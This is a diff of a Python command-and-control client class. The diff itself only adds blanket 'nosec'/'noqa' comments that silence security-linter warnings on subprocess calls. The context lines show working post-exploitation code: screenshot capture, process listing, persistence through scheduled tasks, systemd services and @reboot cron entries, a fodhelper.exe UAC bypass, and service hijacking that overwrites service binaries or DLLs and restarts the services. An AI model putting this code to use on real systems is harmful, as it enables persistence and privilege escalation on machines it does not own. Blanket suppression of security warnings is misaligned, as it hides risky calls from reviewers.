@@ -652,7 +652,7 @@ class C2Client(BaseC2):
             else:
                 cmd_args = command
 
-            result = subprocess.run(
+            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                 cmd_args,
                 check=False,
                 shell=False,
@@ -818,7 +818,7 @@ class C2Client(BaseC2):
                             $graphics.Dispose()
                             $bitmap.Dispose()
                             """
-                            subprocess.run(["powershell", "-Command", ps_command], check=True)
+                            subprocess.run(["powershell", "-Command", ps_command], check=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603, S607
                         else:  # Linux/Unix
                             # Try different screenshot tools
                             screenshot_tools = [
@@ -830,7 +830,7 @@ class C2Client(BaseC2):
 
                             for tool in screenshot_tools:
                                 try:
-                                    subprocess.run(tool, check=True, stderr=subprocess.DEVNULL)
+                                    subprocess.run(tool, check=True, stderr=subprocess.DEVNULL)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                     break
                                 except (subprocess.CalledProcessError, FileNotFoundError) as e:
                                     self.logger.error(
@@ -1246,11 +1246,11 @@ class C2Client(BaseC2):
             try:
                 if os.name == "nt":
                     result = subprocess.run(
-                        ["tasklist"], check=False, capture_output=True, text=True
+                        ["tasklist"], check=False, capture_output=True, text=True  # noqa: S607
                     )
                 else:
                     result = subprocess.run(
-                        ["ps", "aux"], check=False, capture_output=True, text=True
+                        ["ps", "aux"], check=False, capture_output=True, text=True  # noqa: S607
                     )
                 return {"raw_output": result.stdout}
             except (
@@ -1505,7 +1505,7 @@ class C2Client(BaseC2):
                             "/f",  # Force overwrite
                         ]
 
-                        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+                        result = subprocess.run(cmd, capture_output=True, text=True, check=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
                         results["success"] = True
                         results["message"] = f"Task scheduler persistence installed: {task_name}"
@@ -1557,9 +1557,9 @@ WantedBy=multi-user.target
                             f.write(service_content)
 
                         # Enable and start service
-                        subprocess.run(["systemctl", "daemon-reload"], check=True)
-                        subprocess.run(
-                            ["systemctl", "enable", f"{service_name.lower()}.service"], check=True
+                        subprocess.run(["systemctl", "daemon-reload"], check=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
+                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                            ["systemctl", "enable", f"{service_name.lower()}.service"], check=True  # noqa: S607
                         )
 
                         results["success"] = True
@@ -1592,13 +1592,13 @@ WantedBy=multi-user.target
 
                         # Add to user's crontab
                         result = subprocess.run(
-                            ["crontab", "-l"], check=False, capture_output=True, text=True
+                            ["crontab", "-l"], check=False, capture_output=True, text=True  # noqa: S607
                         )
                         existing_cron = result.stdout if result.returncode == 0 else ""
 
                         if cron_entry not in existing_cron:
                             new_cron = existing_cron + f"\n{cron_entry}\n"
-                            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
+                            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
 
                         results["success"] = True
                         results["message"] = "Cron persistence installed: @reboot"
@@ -1946,7 +1946,7 @@ WantedBy=multi-user.target
             # Execute fodhelper.exe to trigger UAC bypass
             # Use subprocess without shell=True for security
             result = subprocess.run(
-                ["fodhelper.exe"],
+                ["fodhelper.exe"],  # noqa: S607
                 check=False,
                 capture_output=True,
                 text=True,
@@ -2155,7 +2155,7 @@ WantedBy=multi-user.target
         try:
             # Check for services with weak permissions
             cmd = ["sc", "query", "state=", "all"]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 # Look for exploitable services with real vulnerability checks
@@ -2207,7 +2207,7 @@ WantedBy=multi-user.target
 
         try:
             # Check sudo configuration
-            result = subprocess.run(["sudo", "-l"], check=False, capture_output=True, text=True)
+            result = subprocess.run(["sudo", "-l"], check=False, capture_output=True, text=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
 
             if result.returncode == 0:
                 sudo_config = result.stdout
@@ -2250,7 +2250,7 @@ WantedBy=multi-user.target
             import shlex
 
             cmd_args = shlex.split(cmd) if isinstance(cmd, str) else cmd
-            result = subprocess.run(
+            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                 cmd_args, check=False, capture_output=True, text=True, shell=False
             )
 
@@ -2597,7 +2597,7 @@ WantedBy=multi-user.target
         try:
             # Get detailed service configuration
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 output = result.stdout
@@ -2636,7 +2636,7 @@ WantedBy=multi-user.target
         try:
             # Use accesschk or sc sdshow to check permissions
             cmd = ["sc", "sdshow", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 sddl = result.stdout.strip()
@@ -2674,7 +2674,7 @@ WantedBy=multi-user.target
         try:
             # Get service binary path
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 output = result.stdout
@@ -2721,7 +2721,7 @@ WantedBy=multi-user.target
         try:
             # Get service binary path
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 output = result.stdout
@@ -2792,7 +2792,7 @@ WantedBy=multi-user.target
         try:
             # Get the unquoted path
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 for line in result.stdout.split("\n"):
@@ -2841,14 +2841,14 @@ WantedBy=multi-user.target
                                     shutil.copy2(temp_exe.name, injection_path)
 
                                     # Try to restart service to trigger exploit
-                                    restart_result = subprocess.run(
-                                        ["sc", "stop", service_name],
+                                    restart_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                        ["sc", "stop", service_name],  # noqa: S607
                                         check=False,
                                         capture_output=True,
                                         text=True,
                                     )
-                                    start_result = subprocess.run(
-                                        ["sc", "start", service_name],
+                                    start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                        ["sc", "start", service_name],  # noqa: S607
                                         check=False,
                                         capture_output=True,
                                         text=True,
@@ -2900,12 +2900,12 @@ WantedBy=multi-user.target
                 "binPath=",
                 f'cmd.exe /c echo exploited > {os.path.join(temp_dir, "service_exploit.txt")}',
             ]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 # Try to start service to execute payload
-                subprocess.run(
-                    ["sc", "start", service_name], check=False, capture_output=True, text=True
+                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                    ["sc", "start", service_name], check=False, capture_output=True, text=True  # noqa: S607
                 )
 
                 return {
@@ -2941,7 +2941,7 @@ WantedBy=multi-user.target
         try:
             # Get service binary path
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 for line in result.stdout.split("\n"):
@@ -2968,11 +2968,11 @@ WantedBy=multi-user.target
                                 shutil.copy2(temp_dll.name, dll_path)
 
                                 # Restart service
-                                subprocess.run(
-                                    ["sc", "stop", service_name], check=False, capture_output=True
+                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                    ["sc", "stop", service_name], check=False, capture_output=True  # noqa: S607
                                 )
-                                subprocess.run(
-                                    ["sc", "start", service_name], check=False, capture_output=True
+                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                    ["sc", "start", service_name], check=False, capture_output=True  # noqa: S607
                                 )
 
                                 return {
@@ -3010,7 +3010,7 @@ WantedBy=multi-user.target
         try:
             # Get service binary path
             cmd = ["sc", "qc", service_name]
-            result = subprocess.run(cmd, check=False, capture_output=True, text=True)
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
 
             if result.returncode == 0:
                 for line in result.stdout.split("\n"):
@@ -3034,11 +3034,11 @@ WantedBy=multi-user.target
                                 shutil.copy2(temp_exe.name, binary_path)
 
                                 # Restart service
-                                stop_result = subprocess.run(
-                                    ["sc", "stop", service_name], check=False, capture_output=True
+                                stop_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                    ["sc", "stop", service_name], check=False, capture_output=True  # noqa: S607
                                 )
-                                start_result = subprocess.run(
-                                    ["sc", "start", service_name],
+                                start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                    ["sc", "start", service_name],  # noqa: S607
                                     check=False,
                                     capture_output=True,
                                     text=True,
